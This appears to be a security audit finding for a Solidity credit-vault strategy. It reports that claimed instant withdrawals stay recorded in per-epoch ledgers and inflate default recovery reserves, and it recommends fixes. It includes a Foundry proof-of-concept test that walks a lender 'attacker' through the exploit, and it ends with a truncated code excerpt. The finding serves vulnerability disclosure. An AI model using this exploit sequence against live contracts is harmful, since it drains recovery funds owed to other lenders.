### Title
Stale instant-withdrawal epoch claims inflate default recovery liabilities - (File: `contracts/strategies/idle/IdleCreditVault.sol`)

### Summary

`claimInstantWithdrawRequest` clears only the aggregate `instantWithdrawsRequests[_user]` balance after paying a funded request, but never releases the per-epoch references in `instantWithdrawsRequestsByEpoch` and `instantWithdrawClaimsByEpoch`. [1](#0-0) 

If that epoch subsequently defaults, `defaultPendingClaimBasis` counts the already-paid epoch claim again whenever any instant withdrawal remains pending. [2](#0-1)  The missing cleanup is the Solidity analogue of a leaked reference: a claim object remains reachable for accounting after its underlying payout was already released.

### Finding Description

The normal funded-claim path performs three actions: reads the aggregate request, burns the user's receipt tokens, clears only `instantWithdrawsRequests[_user]`, and transfers underlying. [3](#0-2) 

It does not clear `instantWithdrawsRequestsByEpoch[_user][epoch]` or reduce `instantWithdrawClaimsByEpoch[epoch]`, even though those fields later determine how much of the same request remains defaulted. [4](#0-3) 

During default finalization, the strategy adds the entire current-epoch `instantWithdrawClaimsByEpoch` value to the defaulted claim basis whenever `pendingInstantWithdraws` is non-zero. [2](#0-1) 

The difference between that stale epoch basis and the unfunded remainder is then treated as a “prefunded” recovery reserve without checking that the corresponding underlying is still held by the strategy. [5](#0-4) [6](#0-5) 

Consequently, an instant receipt that was already funded and paid is counted both as prior cash collateral and as recovery claim basis, even though the paid underlying has left the strategy.

### Impact Explanation

An unprivileged lender can inflate the default recovery denominator and the synthetic prefunded reserve by the amount `A` of an already-claimed instant withdrawal.

The resulting `defaultRecoveryPrice` is computed against accounting reserves that exceed actual strategy cash by `A`, causing earlier recovery claims to consume underlying that should remain reserved for later claimants. [7](#0-6) [8](#0-7) 

This breaks the one-receipt-one-payout and solvency invariants: the same `A` is paid once through the funded-claim path and counted again as prefunded recovery collateral and claim basis.

The stale user-level epoch record also makes the attacker's own later claim basis exceed their remaining aggregate balance, so `_claimDefaultedInstantWithdrawRequest` can underflow and permanently block that user's defaulted instant claim. [9](#0-8) 

The loss scales directly with the first funded claim: for every `A` underlying already paid out, default accounting can record up to `A` nonexistent reserve.

### Likelihood Explanation

The attacker only needs to be an ordinary KYC-passing tranche holder and use public withdrawal flows.

The sequence requires instant withdrawals to be enabled by an APR decrease, at least one funded instant claim, another pending instant request in the same epoch, and an honest borrower default at epoch stop.

Those conditions are normal protocol states rather than privileged misconduct: the manager legitimately calls `getInstantWithdrawFunds`, and default can occur simply because the borrower cannot provide the requested funds. [10](#0-9) 

No existing guard prevents the issue because `collectInstantWithdrawFunds` only decreases the global unfunded counter, while `claimInstantWithdrawRequest` never reconciles the per-epoch claim ledger. [11](#0-10) [1](#0-0) 

### Recommendation

Release the epoch-scoped claim references when an instant withdrawal is paid.

At minimum, `claimInstantWithdrawRequest` should decrement the user's per-epoch receipt and the corresponding `instantWithdrawClaimsByEpoch` bucket by the funded amount, or store requests with explicit funded/unfunded per-epoch buckets so a paid receipt cannot be rediscovered during default finalization.

Additionally, `_defaultPrefundedInstantReserve` should be derived from an explicit funded-claims ledger or actual strategy cash reserved for current-epoch claims, not inferred as `instantWithdrawClaimsByEpoch - pendingInstantWithdraws`. [6](#0-5) 

### Proof of Concept

The following Foundry test uses the existing `IdleCreditVault.t.sol` helpers and demonstrates that one claimed instant withdrawal remains in the default claim basis and creates a nonexistent prefunded reserve.

```solidity
function testStaleInstantEpochClaimInflatesDefaultRecovery() external {
    IdleCreditVault creditVault = IdleCreditVault(address(strategy));

    uint256 staleAmount = 1_000 * ONE_SCALE;
    uint256 pendingAmount = 500 * ONE_SCALE;

    address attacker = makeAddr("stale-instant-attacker");
    address victim = makeAddr("instant-victim");

    _depositWithUser(attacker, staleAmount + pendingAmount, true);
    _depositWithUser(victim, pendingAmount, true);

    // Epoch 0 ends with a lower next APR, enabling instant withdrawal requests.
    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, initialProvidedApr / 4, _expectedFundsEndEpoch());

    uint256 claimEpoch = creditVault.epochNumber();

    // First instant request is funded after the next epoch starts and paid to attacker.
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(staleAmount, address(AAtranche));

    _startEpochAndCheckPrices(1);
    vm.warp(block.timestamp + cdoEpoch.instantWithdrawDelay() + 1);
    vm.prank(manager);
    cdoEpoch.getInstantWithdrawFunds();

    vm.prank(attacker);
    cdoEpoch.claimInstantWithdrawRequest();

    assertEq(creditVault.instantWithdrawsRequests(attacker), 0);
    assertEq(
        creditVault.instantWithdrawsRequestsByEpoch(attacker, claimEpoch),
        staleAmount,
        "funded epoch receipt was not released"
    );

    // New requests remain pending in the same strategy epoch.
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(pendingAmount, address(AAtranche));
    vm.prank(victim);
    cdoEpoch.requestWithdraw(pendingAmount, address(AAtranche));

    assertEq(creditVault.pendingInstantWithdraws(), 2 * pendingAmount);

    // The borrower cannot fund the epoch stop, causing an honest borrower default.
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);
    assertTrue(cdoEpoch.defaulted());

    uint256 pendingBasis = creditVault.defaultPendingClaimBasis();

    // The already-paid staleAmount is counted again because one instant bucket is pending.
    assertEq(
        pendingBasis,
        staleAmount + 2 * pendingAmount,
        "already-paid instant claim entered default basis"
    );

    uint256 recoveryRatio = RECOVERY_FULL / 2;
    uint256 recovered = pendingBasis * recoveryRatio / RECOVERY_FULL;

    deal(defaultUnderlying, manager, recovered);
    vm.startPrank(manager);
    IERC20Detailed(defaultUnderlying).approve(address(strategy), recovered);
    cdoEpoch.finalizeDefault(recovered, manager);
    vm.stopPrank();

    uint256 accountedReserve = creditVault.defaultRecoveryReserve();

    // Finalization adds staleAmount as a synthetic prefunded reserve although those
    // tokens were already transferred to the attacker during the funded claim.
    assertEq(
        accountedReserve,
        recovered + staleAmount,
        "default reserve includes already-paid cash"
    );

    // On a clean fixture with no unrelated strategy underlying, the reserve exceeds
    // actual cash by exactly the stale claim amount.
    assertEq(
        accountedReserve - underlying.balanceOf(address(strategy)),
        staleAmount,
        "recovery reserve is undercollateralized by stale receipt"
    );
}
```

  function _claimDefaultedInstantWithdrawRequest(address _user) internal returns (uint256 claimBasis) {
    uint256 defaultEpoch = defaultRecoveryEpoch;
    claimBasis = instantWithdrawsRequestsByEpoch[_user][defaultEpoch];
    if (claimBasis == 0) return claimBasis;

    instantWithdrawsRequestsByEpoch[_user][defaultEpoch] = 0;
    instantWithdrawsRequests[_user] -= claimBasis;
    uint256 pending = pendingInstantWithdraws;
    // `pendingInstantWithdraws` is only the unfunded remainder. If this user's claim is larger,
    // the extra amount was already counted as prefunded reserve during default finalization.
    pendingInstantWithdraws = claimBasis >= pending ? 0 : pending - claimBasis;
    instantWithdrawClaimsByEpoch[defaultEpoch] -= claimBasis;
    _burn(_user, claimBasis);
    _transferDefaultRecovery(_user, (claimBasis * defaultRecoveryPrice) / RECOVERY_FULL);
